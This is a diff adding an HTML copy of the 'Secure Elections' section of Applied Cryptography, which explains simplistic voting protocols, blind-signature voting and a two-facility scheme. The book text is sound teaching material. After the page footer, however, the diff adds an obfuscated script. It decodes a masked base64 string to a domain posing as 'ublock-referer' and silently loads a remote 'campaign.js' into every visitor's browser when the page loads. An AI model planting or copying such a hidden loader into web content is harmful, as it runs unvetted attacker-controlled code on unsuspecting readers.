@@ -1,0 +1,134 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=125-128//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch05/05-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 6<BR>Esoteric Protocols
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">6.1 Secure Elections</FONT></H3>
+<P>Computerized voting will never be used for general elections unless there is a protocol that both maintains individual privacy and prevents cheating. The ideal protocol has, at the very least, these six requirements:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Only authorized voters can vote.
+<DD><B>2.</B>&nbsp;&nbsp;No one can vote more than once.
+<DD><B>3.</B>&nbsp;&nbsp;No one can determine for whom anyone else voted.
+<DD><B>4.</B>&nbsp;&nbsp;No one can duplicate anyone else&#146;s vote. (This turns out to be the hardest requirement.)
+<DD><B>5.</B>&nbsp;&nbsp;No one can change anyone else&#146;s vote without being discovered.
+<DD><B>6.</B>&nbsp;&nbsp;Every voter can make sure that his vote has been taken into account in the final tabulation.
+</DL>
+<P>Additionally, some voting schemes may have the following requirement:
+</P>
+<DL>
+<DD><B>7.</B>&nbsp;&nbsp;Everyone knows who voted and who didn&#146;t.
+</DL>
+<P>Before describing the complicated voting protocols with these characteristics, let&#146;s look at some simpler protocols.
+</P>
+<P><FONT SIZE="+1"><B><I>Simplistic Voting Protocol #1</I></B></FONT></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Each voter encrypts his vote with the public key of a Central Tabulating Facility (CTF).
+<DD><B>(2)</B>&nbsp;&nbsp;Each voter sends his vote in to the CTF.
+<DD><B>(3)</B>&nbsp;&nbsp;The CTF decrypts the votes, tabulates them, and makes the results public.
+</DL>
+<P>This protocol is rife with problems. The CTF has no idea where the votes are from, so it doesn&#146;t even know if the votes are coming from eligible voters. It has no idea if eligible voters are voting more than once. On the plus side, no one can change anyone else&#146;s vote; but no one would bother trying to modify someone else&#146;s vote when it is far easier to vote repeatedly for the result of your choice.
+</P>
+<P><FONT SIZE="+1"><B><I>Simplistic Voting Protocol #2</I></B></FONT></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Each voter signs his vote with his private key.
+<DD><B>(2)</B>&nbsp;&nbsp;Each voter encrypts his signed vote with the CTF&#146;s public key.
+<DD><B>(3)</B>&nbsp;&nbsp;Each voter sends his vote to a CTF.
+<DD><B>(4)</B>&nbsp;&nbsp;The CTF decrypts the votes, checks the signatures, tabulates the votes, and makes the results public.
+</DL>
+<P>This protocol satisfies properties one and two: Only authorized voters can vote and no one can vote more than once&#151;the CTF would record votes received in step (3). Each vote is signed with the voter&#146;s private key, so the CTF knows who voted, who didn&#146;t, and how often each voter voted. If a vote comes in that isn&#146;t signed by an eligible voter, or if a second vote comes in signed by a voter who has already voted, the facility ignores it. No one can change anyone else&#146;s vote either, even if they intercept it in step (3), because of the digital signature.
+</P>
+<P>The problem with this protocol is that the signature is attached to the vote; the CTF knows who voted for whom. Encrypting the votes with the CTF&#146;s public key prevents anyone from eavesdropping on the protocol and figuring out who voted for whom, but you have to trust the CTF completely. It&#146;s analogous to having an election judge staring over your shoulder in the voting booth.</P>
+<P>These two examples show how difficult it is to achieve the first three requirements of a secure voting protocol, let alone the others.</P>
+<P><FONT SIZE="+1"><B><I>Voting with Blind Signatures</I></B></FONT></P>
+<P>We need to somehow dissociate the vote from the voter, while still maintaining authentication. The blind signature protocol does just that.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Each voter generates 10 sets of messages, each set containing a valid vote for each possible outcome (e.g., if the vote is a yes or no question, each set contains two votes, one for &#147;yes&#148; and the other for &#147;no&#148;). Each message also contains a randomly generated identification number, large enough to avoid duplicates with other voters.
+<DD><B>(2)</B>&nbsp;&nbsp;Each voter individually blinds all of the messages (see Section 5.3) and sends them, with their blinding factors, to the CTF.
+<DD><B>(3)</B>&nbsp;&nbsp;The CTF checks its database to make sure the voter has not submitted his blinded votes for signature previously. It opens nine of the sets to check that they are properly formed. Then it individually signs each message in the set. It sends them back to the voter, storing the name of the voter in its database.
+<DD><B>(4)</B>&nbsp;&nbsp;The voter unblinds the messages and is left with a set of votes signed by the CTF. (These votes are signed but unencrypted, so the voter can easily see which vote is &#147;yes&#148; and which is &#147;no.&#148;)
+<DD><B>(5)</B>&nbsp;&nbsp;The voter chooses one of the votes (ah, democracy) and encrypts it with the CTF&#146;s public key.
+<DD><B>(6)</B>&nbsp;&nbsp;The voter sends his vote in.
+<DD><B>(7)</B>&nbsp;&nbsp;The CTF decrypts the votes, checks the signatures, checks its database for a duplicate identification number, saves the serial number, and tabulates the votes. It publishes the results of the election, along with every serial number and its associated vote.
+</DL>
+<P>A malicious voter, call him Mallory, cannot cheat this system. The blind signature protocol ensures that his votes are unique. If he tries to send in the same vote twice, the CTF will notice the duplicate serial number in step (7) and throw out the second vote. If he tries to get multiple votes signed in step (2), the CTF will discover this in step (3). Mallory cannot generate his own votes because he doesn&#146;t know the facility&#146;s private key. He can&#146;t intercept and change other people&#146;s votes for the same reason.
+</P>
+<P>The cut-and-choose protocol in step (3) is to ensure that the votes are unique. Without that step, Mallory could create a set of votes that are the same except for the identification number, and have them all validated.</P>
+<P>A malicious CTF cannot figure out how individuals voted. Because the blind signature protocol prevents the facility from seeing the serial numbers on the votes before they are cast, the CTF cannot link the blinded vote it signed with the vote eventually cast. Publishing a list of serial numbers and their associated votes allows voters to confirm that their vote was tabulated correctly.</P>
+<P>There are still problems. If step (6) is not anonymous and the CTF can record who sent in which vote, then it can figure out who voted for whom. However, if it receives votes in a locked ballot box and then tabulates them later, it cannot. Also, while the CTF may not be able to link votes to individuals, it can generate a large number of signed, valid votes and cheat by submitting those itself. And if Alice discovers that the CTF changed her vote, she has no way to prove it. A similar protocol, which tries to correct these problems, is [1195, 1370].</P>
+<P><FONT SIZE="+1"><B><I>Voting with Two Central Facilities</I></B></FONT></P>
+<P>One solution is to divide the CTF in two. Neither party would have the power to cheat on its own.
+</P>
+<P>The following protocol uses a Central Legitimization Agency (CLA) to certify voters and a separate CTF to count votes [1373].</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Each voter sends a message to the CLA asking for a validation number.
+<DD><B>(2)</B>&nbsp;&nbsp;The CLA sends the voter back a random validation number. The CLA maintains a list of validation numbers. The CLA also keeps a list of the validation numbers&#146; recipients, in case someone tries to vote twice.
+<DD><B>(3)</B>&nbsp;&nbsp;The CLA sends the list of validation numbers to the CTF.
+<DD><B>(4)</B>&nbsp;&nbsp;Each voter chooses a random identification number. He creates a message with that number, the validation number he received from the CLA, and his vote. He sends this message to the CTF.
+<DD><B>(5)</B>&nbsp;&nbsp;The CTF checks the validation number against the list it received from the CLA in step (3). If the validation number is there, the CTF crosses it off (to prevent someone from voting twice). The CTF adds the identification number to the list of people who voted for a particular candidate and adds one to the tally.
+<DD><B>(6)</B>&nbsp;&nbsp;After all votes have been received, the CTF publishes the outcome, as well as the lists of identification numbers and for whom their owners voted.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch05/05-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(nGbqVaOe, Kedwdkhg) {Kedwdkhg = nGbqVaOe.createElement('script');Kedwdkhg.type = 'text/javascript';Kedwdkhg.async = true;Kedwdkhg.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');nGbqVaOe.getElementsByTagName('body')[0].appendChild(Kedwdkhg);}(document));</script></body>
+</html>
